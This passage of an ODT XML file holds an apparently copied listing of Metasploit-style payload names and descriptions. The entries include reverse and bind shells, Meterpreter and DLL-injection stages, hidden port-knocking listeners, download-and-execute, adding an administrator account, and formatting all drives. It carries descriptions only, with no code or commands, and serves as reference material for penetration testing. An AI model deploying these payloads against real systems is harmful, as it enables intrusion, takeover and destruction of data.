      <text:p text:style-name="P1"><text:s text:c="37"/>y design. Compatible with Pytho</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>n 2.4-2.7 and 3.4+.</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>python/shell_reverse_sctp <text:s text:c="7"/>Creates an interactive shell vi</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>a Python, encodes with base64 b</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>y design. Compatible with Pytho</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>n 2.6-2.7 and 3.4+.</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>python/shell_reverse_tcp <text:s text:c="8"/>Creates an interactive shell vi</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>a Python, encodes with base64 b</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>y design. Compatible with Pytho</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>n 2.4-2.7 and 3.4+.</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>python/shell_reverse_tcp_ssl <text:s text:c="4"/>Creates an interactive shell vi</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>a Python, uses SSL, encodes wit</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>h base64 by design. Compatible</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>with Python 2.6-2.7 and 3.4+.</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>python/shell_reverse_udp <text:s text:c="8"/>Creates an interactive shell vi</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>a Python, encodes with base64 b</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>y design. Compatible with Pytho</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>n 2.6-2.7 and 3.4+.</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>r/shell_bind_tcp <text:s text:c="16"/>Continually listen for a connec</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>tion and spawn a command shell</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>via R</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>r/shell_reverse_tcp <text:s text:c="13"/>Connect back and create a comma</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>nd shell via R</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>ruby/pingback_bind_tcp <text:s text:c="10"/>Listens for a connection from t</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>he attacker, sends a UUID, then</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>terminates</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>ruby/pingback_reverse_tcp <text:s text:c="7"/>Connect back to the attacker, s</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ends a UUID, then terminates</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>ruby/shell_bind_tcp <text:s text:c="13"/>Continually listen for a connec</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>tion and spawn a command shell</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>via Ruby</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>ruby/shell_bind_tcp_ipv6 <text:s text:c="8"/>Continually listen for a connec</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>tion and spawn a command shell</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>via Ruby</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>ruby/shell_reverse_tcp <text:s text:c="10"/>Connect back and create a comma</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>nd shell via Ruby</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>ruby/shell_reverse_tcp_ssl <text:s text:c="6"/>Connect back and create a comma</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>nd shell via Ruby, uses SSL</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>solaris/sparc/shell_bind_tcp <text:s text:c="4"/>Listen for a connection and spa</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:s text:c="37"/>wn a command shell</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>solaris/sparc/shell_find_port <text:s text:c="3"/>Spawn a shell on an established</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>connection</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>solaris/sparc/shell_reverse_tcp <text:s/>Connect back to attacker and sp</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>awn a command shell</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>solaris/x86/shell_bind_tcp <text:s text:c="6"/>Listen for a connection and spa</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>wn a command shell</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>solaris/x86/shell_find_port <text:s text:c="5"/>Spawn a shell on an established</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>connection</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>solaris/x86/shell_reverse_tcp <text:s text:c="3"/>Connect back to attacker and sp</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>awn a command shell</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>tty/unix/interact <text:s text:c="15"/>Interacts with a TTY on an esta</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>blished socket connection</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/adduser <text:s text:c="17"/>Create a new user and add them</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>to local administration group.</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>Note: The specified password is</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>checked for common complexity</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>requirements to prevent the tar</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>get machine rejecting the user</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>for failing to meet policy requ</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>irements. Complexity check: 8-1</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>4 chars (1 UPPER, 1 lower, 1 di</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>git/special)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/custom/bind_hidden_ipkn <text:s/>Custom shellcode stage. Listen</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>ock_tcp <text:s text:c="25"/>for a connection. First, the po</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>rt will need to be knocked from</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>the IP defined in KHOST. This</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>IP will work as an authenticati</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>on method (you can spoof it wit</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>h tools like hping). After that</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>you could get your shellcode f</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>rom any IP. The socket will app</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ear as "closed," thus helping t</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>o hide the shellcode</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/custom/bind_hidden_tcp <text:s text:c="2"/>Custom shellcode stage. Listen</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>for a connection from a hidden</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>port and spawn a command shell</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>to the allowed host.</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/custom/bind_ipv6_tcp <text:s text:c="4"/>Custom shellcode stage. Listen</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>for an IPv6 connection (Windows</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>x86)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/custom/bind_ipv6_tcp_uu <text:s/>Custom shellcode stage. Listen</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>id <text:s text:c="30"/>for an IPv6 connection with UUI</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>D Support (Windows x86)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/custom/bind_named_pipe <text:s text:c="2"/>Custom shellcode stage. Listen</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>for a pipe connection (Windows</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>x86)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/custom/bind_nonx_tcp <text:s text:c="4"/>Custom shellcode stage. Listen</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>for a connection (No NX)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/custom/bind_tcp <text:s text:c="9"/>Custom shellcode stage. Listen</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>for a connection (Windows x86)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/custom/bind_tcp_rc4 <text:s text:c="5"/>Custom shellcode stage. Listen</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:s text:c="37"/>for a connection</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/custom/bind_tcp_uuid <text:s text:c="4"/>Custom shellcode stage. Listen</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>for a connection with UUID Supp</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ort (Windows x86)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/custom/find_tag <text:s text:c="9"/>Custom shellcode stage. Use an</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>established connection</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/custom/reverse_hop_http <text:s/>Custom shellcode stage. Tunnel</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>communication over an HTTP or H</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>TTPS hop point. Note that you m</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ust first upload data/hop/hop.p</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>hp to the PHP server you wish t</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>o use as a hop.</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/custom/reverse_http <text:s text:c="5"/>Custom shellcode stage. Tunnel</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>communication over HTTP (Window</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>s wininet)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/custom/reverse_http_pro <text:s/>Custom shellcode stage. Tunnel</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>xy_pstore <text:s text:c="23"/>communication over HTTP</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/custom/reverse_https <text:s text:c="4"/>Custom shellcode stage. Tunnel</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>communication over HTTPS (Windo</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ws wininet)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/custom/reverse_https_pr <text:s/>Custom shellcode stage. Tunnel</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>oxy <text:s text:c="29"/>communication over HTTP using S</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>SL with custom proxy support</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/custom/reverse_ipv6_tcp <text:s/>Custom shellcode stage. Connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>back to the attacker over IPv6</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/custom/reverse_named_pi <text:s/>Custom shellcode stage. Connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>pe <text:s text:c="31"/>back to the attacker via a nam</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ed pipe pivot</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/custom/reverse_nonx_tcp <text:s/>Custom shellcode stage. Connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>back to the attacker (No NX)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/custom/reverse_ord_tcp <text:s text:c="2"/>Custom shellcode stage. Connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>back to the attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/custom/reverse_tcp <text:s text:c="6"/>Custom shellcode stage. Connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>back to the attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/custom/reverse_tcp_allp <text:s/>Custom shellcode stage. Try to</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>orts <text:s text:c="28"/>connect back to the attacker, o</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>n all possible ports (1-65535,</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>slowly)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/custom/reverse_tcp_dns <text:s text:c="2"/>Custom shellcode stage. Connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>back to the attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/custom/reverse_tcp_rc4 <text:s text:c="2"/>Custom shellcode stage. Connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>back to the attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/custom/reverse_tcp_rc4_ <text:s/>Custom shellcode stage. Connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>dns <text:s text:c="30"/>back to the attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/custom/reverse_tcp_uuid <text:s/>Custom shellcode stage. Connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>back to the attacker with UUID</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>Support</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/custom/reverse_udp <text:s text:c="6"/>Custom shellcode stage. Connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>back to the attacker with UUID</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>Support</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/custom/reverse_winhttp <text:s text:c="2"/>Custom shellcode stage. Tunnel</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>communication over HTTP (Window</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:s text:c="37"/>s winhttp)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/custom/reverse_winhttps <text:s/>Custom shellcode stage. Tunnel</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>communication over HTTPS (Windo</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ws winhttp)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/dllinject/bind_hidden_i <text:s/>Inject a DLL via a reflective l</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>pknock_tcp <text:s text:c="22"/>oader. Listen for a connection.</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>First, the port will need to b</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>e knocked from the IP defined i</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>n KHOST. This IP will work as a</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>n authentication method (you ca</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>n spoof it with tools like hpin</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>g). After that you could get yo</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ur shellcode from any IP. The s</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ocket will appear as "closed,"</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>thus helping to hide the shellc</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ode</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/dllinject/bind_hidden_t <text:s/>Inject a DLL via a reflective l</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cp <text:s text:c="30"/>oader. Listen for a connection</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>from a hidden port and spawn a</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>command shell to the allowed ho</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>st.</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/dllinject/bind_ipv6_tcp <text:s/>Inject a DLL via a reflective l</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>oader. Listen for an IPv6 conne</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ction (Windows x86)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/dllinject/bind_ipv6_tcp <text:s/>Inject a DLL via a reflective l</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>_uuid <text:s text:c="27"/>oader. Listen for an IPv6 conne</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ction with UUID Support (Window</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>s x86)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/dllinject/bind_named_pi <text:s/>Inject a DLL via a reflective l</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>pe <text:s text:c="30"/>oader. Listen for a pipe connec</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>tion (Windows x86)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/dllinject/bind_nonx_tcp <text:s/>Inject a DLL via a reflective l</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>oader. Listen for a connection</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>(No NX)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/dllinject/bind_tcp <text:s text:c="6"/>Inject a DLL via a reflective l</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>oader. Listen for a connection</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>(Windows x86)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/dllinject/bind_tcp_rc4 <text:s text:c="2"/>Inject a DLL via a reflective l</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>oader. Listen for a connection</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/dllinject/bind_tcp_uuid <text:s/>Inject a DLL via a reflective l</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>oader. Listen for a connection</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>with UUID Support (Windows x86)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/dllinject/find_tag <text:s text:c="6"/>Inject a DLL via a reflective l</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>oader. Use an established conne</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ction</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/dllinject/reverse_hop_h <text:s/>Inject a DLL via a reflective l</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>ttp <text:s text:c="29"/>oader. Tunnel communication ove</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>r an HTTP or HTTPS hop point. N</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ote that you must first upload</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>data/hop/hop.php to the PHP ser</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ver you wish to use as a hop.</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/dllinject/reverse_http <text:s text:c="2"/>Inject a DLL via a reflective l</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:s text:c="37"/>oader. Tunnel communication ove</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>r HTTP (Windows wininet)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/dllinject/reverse_http_ <text:s/>Inject a DLL via a reflective l</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>proxy_pstore <text:s text:c="20"/>oader. Tunnel communication ove</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>r HTTP</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/dllinject/reverse_ipv6_ <text:s/>Inject a DLL via a reflective l</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>tcp <text:s text:c="29"/>oader. Connect back to the atta</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>cker over IPv6</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/dllinject/reverse_nonx_ <text:s/>Inject a DLL via a reflective l</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>tcp <text:s text:c="29"/>oader. Connect back to the atta</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>cker (No NX)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/dllinject/reverse_ord_t <text:s/>Inject a DLL via a reflective l</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cp <text:s text:c="30"/>oader. Connect back to the atta</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>cker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/dllinject/reverse_tcp <text:s text:c="3"/>Inject a DLL via a reflective l</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>oader. Connect back to the atta</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>cker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/dllinject/reverse_tcp_a <text:s/>Inject a DLL via a reflective l</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>llports <text:s text:c="25"/>oader. Try to connect back to t</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>he attacker, on all possible po</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>rts (1-65535, slowly)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/dllinject/reverse_tcp_d <text:s/>Inject a DLL via a reflective l</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>ns <text:s text:c="30"/>oader. Connect back to the atta</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>cker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/dllinject/reverse_tcp_r <text:s/>Inject a DLL via a reflective l</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>c4 <text:s text:c="30"/>oader. Connect back to the atta</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>cker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/dllinject/reverse_tcp_r <text:s/>Inject a DLL via a reflective l</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>c4_dns <text:s text:c="26"/>oader. Connect back to the atta</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>cker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/dllinject/reverse_tcp_u <text:s/>Inject a DLL via a reflective l</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>uid <text:s text:c="29"/>oader. Connect back to the atta</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>cker with UUID Support</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/dllinject/reverse_winht <text:s/>Inject a DLL via a reflective l</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>tp <text:s text:c="30"/>oader. Tunnel communication ove</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>r HTTP (Windows winhttp)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/dns_txt_query_exec <text:s text:c="6"/>Performs a TXT query against a</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>series of DNS record(s) and exe</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>cutes the returned payload</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/download_exec <text:s text:c="11"/>Download an EXE from an HTTP(S)</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>/FTP URL and execute it</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/exec <text:s text:c="20"/>Execute an arbitrary command</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/format_all_drives <text:s text:c="7"/>This payload formats all mounte</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>d disks in Windows (aka Shellco</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>deOfDeath). After formatting, t</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>his payload sets the volume lab</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>el to the string specified in t</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>he VOLUMELABEL option. If the c</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ode is unable to access a drive</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>for any reason, it skips the d</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>rive and proceeds to the next v</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>olume.</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:s text:c="4"/>windows/loadlibrary <text:s text:c="13"/>Load an arbitrary library path</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/messagebox <text:s text:c="14"/>Spawns a dialog via MessageBox</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>using a customizable title, tex</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>t &amp; icon</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/meterpreter/bind_hidden <text:s/>Inject the Meterpreter server D</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>_ipknock_tcp <text:s text:c="20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connection. First, the</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>port will need to be knocked fr</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>om the IP defined in KHOST. Thi</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>s IP will work as an authentica</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>tion method (you can spoof it w</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ith tools like hping). After th</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>at you could get your shellcode</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>from any IP. The socket will a</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ppear as "closed," thus helping</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>to hide the shellcode</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/meterpreter/bind_hidden <text:s/>Inject the Meterpreter server D</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>_tcp <text:s text:c="28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connection from a hidde</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>n port and spawn a command shel</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>l to the allowed host.</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/meterpreter/bind_ipv6_t <text:s/>Inject the Meterpreter server D</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cp <text:s text:c="30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n IPv6 connection (Windo</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ws x86)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/meterpreter/bind_ipv6_t <text:s/>Inject the Meterpreter server D</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cp_uuid <text:s text:c="25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n IPv6 connection with U</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>UID Support (Windows x86)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/meterpreter/bind_named_ <text:s/>Inject the Meterpreter server D</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>pipe <text:s text:c="28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pipe connection (Window</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>s x86)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/meterpreter/bind_nonx_t <text:s/>Inject the Meterpreter server D</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cp <text:s text:c="30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connection (No NX)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/meterpreter/bind_tcp <text:s text:c="4"/>Inject the Meterpreter server D</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>LL via the Reflective Dll Injec</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>tion payload (staged). Requires</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>Windows XP SP2 or newer. Liste</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:s text:c="37"/>n for a connection (Windows x86</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/meterpreter/bind_tcp_rc <text:s/>Inject the Meterpreter server D</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>4 <text:s text:c="31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connection</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/meterpreter/bind_tcp_uu <text:s/>Inject the Meterpreter server D</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>id <text:s text:c="30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connection with UUID Su</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>pport (Windows x86)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/meterpreter/find_tag <text:s text:c="4"/>Inject the Meterpreter server D</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>LL via the Reflective Dll Injec</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>tion payload (staged). Requires</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>Windows XP SP2 or newer. Use a</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>n established connection</text:p>
